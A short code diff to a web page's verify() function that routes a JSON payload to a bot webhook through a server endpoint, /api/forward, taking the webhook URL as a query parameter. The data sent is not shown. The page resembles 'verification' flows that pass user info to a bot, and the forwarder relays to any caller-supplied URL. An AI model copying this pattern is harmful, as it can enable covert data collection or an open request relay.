@@ -37,7 +37,7 @@ function verify() {
 
   document.getElementById('status').textContent = "🔄 Verifying...";
 
-  fetch(webhook, {
+  fetch(`/api/forward?webhook=${encodeURIComponent(webhook)}`, {
     method: "POST",
     headers: { "Content-Type": "application/json" },
     body: JSON.stringify(payload)
@@ -47,7 +47,7 @@ function verify() {
       successAudio.play();
       document.getElementById('status').textContent = "✅ Verified! Info sent to bot.";
     } else {
-      document.getElementById('status').textContent = "❌ Failed to contact bot.";
+      document.getElementById('status').textContent = "❌ Bot responded with error.";
     }
   })
   .catch(err => {
